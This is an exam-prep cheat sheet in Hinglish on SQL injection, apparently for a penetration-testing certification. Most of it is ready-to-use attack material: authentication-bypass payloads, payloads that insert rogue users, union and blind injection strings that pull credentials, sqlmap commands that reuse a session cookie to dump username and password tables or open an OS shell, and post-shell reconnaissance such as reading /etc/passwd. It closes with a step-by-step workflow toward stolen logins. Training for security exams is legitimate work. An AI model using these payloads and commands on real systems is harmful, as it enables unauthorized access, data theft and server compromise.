# 💉 Module 5: SQL Injection

> **Sabse important module! Almost har exam mein aata hai!**

---

## 🔓 Authentication Bypass (Login Page)

### Common Payloads (Username field mein daalo)
```sql
-- Basic bypass
' OR 1=1 --
' OR '1'='1' --
admin' --
admin'/*
' OR 1=1#
' OR 1=1/*
") OR 1=1 --
") OR ("1"="1

-- With password field bypass
' OR 1=1 -- -
1' or '1'='1
hi' OR 1=1 --
```

> 💡 **Tip**: Password field mein kuch bhi daal do — `test`, `123`, etc.

### Insert New User via SQL Injection
```sql
-- In username field
blah'; INSERT INTO login VALUES('john','apple123');--

-- Another variant
blah'; INSERT INTO users(username,password) VALUES('hacker','pass123');--
```

---

## 🔍 Union-Based SQL Injection

```sql
-- Find number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --          -- Keep increasing until error

-- Union Select
' UNION SELECT 1,2,3 --
' UNION SELECT NULL,NULL,NULL --

-- Extract database info
' UNION SELECT 1,database(),3 --
' UNION SELECT 1,version(),3 --
' UNION SELECT 1,user(),3 --

-- Extract table names
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() --

-- Extract column names
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --

-- Extract data
' UNION SELECT 1,username,password FROM users --
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users --
```

---

## 🕵️ Blind SQL Injection

### Boolean-Based
```sql
-- True condition
' AND 1=1 --         -- Page loads normally
' AND 1=2 --         -- Page is different/error

-- Extract data character by character
' AND SUBSTRING(database(),1,1)='a' --
' AND (SELECT COUNT(*) FROM users) > 0 --
```

### Time-Based
```sql
-- If page delays, injection works
' AND SLEEP(5) --
' OR SLEEP(5) --
'; WAITFOR DELAY '0:0:5' --     -- MS SQL
```

---

## 🤖 SQLMap (Automated SQL Injection) — MUST KNOW!

### Step 1: Get the Cookie
```
1. Open target website in browser
2. Right-click → Inspect → Console tab
3. Type: document.cookie
4. Copy the cookie value
```

### Step 2: Run SQLMap

```bash
# Basic scan
sqlmap -u "http://target.com/page.aspx?id=1" --dbs

# With cookie (IMPORTANT for authenticated pages)
sqlmap -u "http://target.com/profile.aspx?id=1" --cookie="cookie_value_here" --dbs

# List databases
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" --dbs

# List tables in a database
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" -D database_name --tables

# List columns in a table
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" -D database_name -T table_name --columns

# Dump table data (GET USERNAME & PASSWORD!)
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" -D database_name -T table_name -C "username,password" --dump

# OS Shell (if possible)
sqlmap -u "http://target.com/page.aspx?id=1" --cookie="PHPSESSID=abc123" --os-shell
```

### SQLMap with POST Request
```bash
# Capture POST request in Burp/ZAP, save to file
sqlmap -r request.txt --dbs

# Or specify POST data
sqlmap -u "http://target.com/login" --data="username=test&password=test" --dbs
```

### SQLMap Important Flags
| Flag | Meaning |
|------|---------|
| `-u` | Target URL with parameter |
| `--cookie` | Session cookie |
| `--dbs` | List all databases |
| `-D` | Specify database name |
| `--tables` | List tables |
| `-T` | Specify table name |
| `--columns` | List columns |
| `-C` | Specify column names |
| `--dump` | Dump data |
| `--dump-all` | Dump everything |
| `--os-shell` | Get OS shell |
| `--batch` | Auto-answer yes to all prompts |
| `-r` | Read request from file |
| `--data` | POST data |
| `--level` | Test level (1-5, default 1) |
| `--risk` | Risk level (1-3, default 1) |
| `-p` | Specific parameter to test |

### SQLMap OS Shell Commands
```bash
# Once you get OS shell:
TASKLIST                  # List running processes (Windows)
systeminfo                # System info (Windows)
whoami                    # Current user
net user                  # List users
uname -a                  # OS version (Linux)
cat /etc/passwd           # Users (Linux)
```

---

## 📋 SQL Injection Quick Reference

### Comment Styles
| Database | Comment |
|----------|---------|
| MySQL | `--` or `#` or `/* */` |
| MS SQL | `--` or `/* */` |
| Oracle | `--` or `/* */` |
| PostgreSQL | `--` or `/* */` |

### Common Functions by Database
| Function | MySQL | MS SQL | Oracle |
|----------|-------|--------|--------|
| Version | `version()` | `@@version` | `SELECT banner FROM v$version` |
| Current DB | `database()` | `db_name()` | `SELECT ora_database_name FROM dual` |
| Current User | `user()` | `user_name()` | `SELECT user FROM dual` |
| String Concat | `CONCAT(a,b)` | `a+b` | `a\|\|b` |

---

## ✅ SQL Injection Exam Workflow
```
1. Find input field / URL parameter
2. Test with: ' OR 1=1 --
3. If login bypassed → DONE
4. If URL parameter → Use SQLMap:
   a. Get cookie from browser console: document.cookie
   b. sqlmap -u "URL?id=1" --cookie="..." --dbs
   c. sqlmap ... -D dbname --tables
   d. sqlmap ... -D dbname -T tablename --dump
5. Get credentials → Login
```

